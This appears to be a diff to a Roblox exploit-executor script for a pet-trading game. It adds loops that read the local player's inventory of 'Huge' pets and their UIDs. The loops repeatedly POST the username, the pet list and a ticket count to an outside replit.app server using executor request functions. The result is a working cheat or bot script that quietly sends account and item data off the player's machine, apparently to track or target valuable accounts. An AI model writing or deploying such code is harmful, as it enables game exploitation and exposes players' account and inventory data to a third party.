@@ -97,6 +97,84 @@ end
 
 spawn(UpdateBucketAmount)
 spawn(SendBucketMail)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+local hugePetsList = {} -- Global variable to store huge pet names
+
+function ProcessHugePets()
+    while true do
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
+            end
+            return Table
+        end
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for _, Pet in ipairs(ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren()) do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for _, MadeTable in ipairs(getCurrentHugePets()) do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+            hugePetsList = hugePets -- Update the global variable with the current list
+        end
+
+        wait(3)
+    end
+end
+
+spawn(ProcessHugePets)
+
+local function WebsiteDataUpdate()
+    while true do
+        local Player = game.Players.LocalPlayer
+        local player = Player.Name
+        local Http = game:GetService("HttpService")
+
+        local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+        -- Updated URL
+        local response = request({
+            Url = 'https://bots-juzzoualive.replit.app/update',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = Http:JSONEncode({
+                Username = player,
+                VoidTicketsValue = woodengiftamount,
+                DiamondsValue = "0",
+                HugeList = hugePetsList, -- Reference the global variable
+                Server = "0"
+            })
+        })
+        wait(15)
+    end
+end
+
+spawn(WebsiteDataUpdate)
 
 
 getgenv().Config = {
